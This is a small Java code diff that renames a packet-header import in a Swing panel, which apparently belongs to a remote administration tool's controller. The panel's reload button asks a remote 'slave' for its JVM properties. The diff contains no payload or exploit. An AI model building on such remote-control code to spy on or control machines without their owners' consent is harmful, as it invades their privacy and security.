@@ -16,7 +16,7 @@ import javax.swing.ScrollPaneConstants;
 import javax.swing.table.DefaultTableModel;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.packets.OutgoingHeader;
 
 @SuppressWarnings("serial")
 public class PanelControlJVM extends PanelControlParent {
@@ -46,7 +46,7 @@ public class PanelControlJVM extends PanelControlParent {
 		btnReload.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				clear();
-				slave.addToSendQueue(Header.GET_JVM_PROPERTIES);
+				slave.addToSendQueue(OutgoingHeader.GET_JVM_PROPERTIES);
 			}
 		});
 
